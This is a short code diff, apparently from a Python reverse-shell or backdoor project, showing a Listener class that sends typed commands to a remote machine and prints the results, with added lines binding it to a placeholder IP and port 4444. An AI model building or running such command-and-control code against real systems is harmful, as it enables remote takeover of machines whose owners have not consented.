@@ -21,3 +21,6 @@ class Listener:
             command = raw_input(">> ")
             result = self.execute_remotely(command)
             print(result)
+
+my_listener = Listener("xx.x.x.xx", 4444)
+my_listener.run()
